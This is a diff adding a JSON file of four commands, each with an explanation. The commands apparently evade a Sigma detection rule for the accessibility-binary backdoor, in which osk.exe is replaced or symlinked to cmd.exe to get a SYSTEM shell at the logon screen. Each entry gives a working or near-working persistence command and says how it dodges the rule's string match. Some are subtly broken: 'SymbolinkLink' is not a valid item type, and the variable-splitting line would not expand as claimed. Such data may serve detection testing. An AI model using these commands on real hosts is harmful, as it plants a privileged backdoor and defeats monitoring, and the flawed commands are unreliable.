@@ -1,0 +1,18 @@
+[
+  {
+    "output": "powershell -Command \"New-Item -ItemType SymbolinkLink -Path 'C:\\Windows\\System32\\osk.exe' -Target 'C:\\Windows\\System32\\cmd.exe' -Force\"",
+    "explanation": "The Sigma rule specifically looks for the execution of 'mklink' via the command line. By using the PowerShell native cmdlet 'New-Item' with the '-ItemType SymbolinkLink' parameter, the same functional result is achieved (creating a symlink) without triggering the 'mklink' string match in the command line logs."
+  },
+  {
+    "output": "cmd.exe /c \"set a=mk; set b=link; %a%%b% C:\\windows\\system32\\osk.exe C:\\windows\\system32\\cmd.exe\"",
+    "explanation": "This bypass uses environment variable fragmentation. The rule looks for the literal string 'mklink'. By splitting the command into variables and concatenating them at execution time, the static 'CommandLine' filter fails to find the 'mklink' pattern."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe /y",
+    "explanation": "The rule is strictly focused on symbolic link creation (T1546.008 via mklink). An attacker with sufficient privileges can simply overwrite 'osk.exe' with a copy of 'cmd.exe'. This achieves the same goal (getting a SYSTEM shell from the logon screen) but bypasses the 'mklink' detection logic entirely."
+  },
+  {
+    "output": "mklink \"C:\\Windows\\System32\\osk.exe\" \"..\\..\\Windows\\System32\\cmd.exe\"",
+    "explanation": "The rule checks for the specific string '\\cmd.exe'. By using relative paths or varying the path structure (e.g., using forward slashes or redundant dots), the 'contains' logic may fail depending on how strictly the SIEM processes the 'selection_cli' strings."
+  }
+]
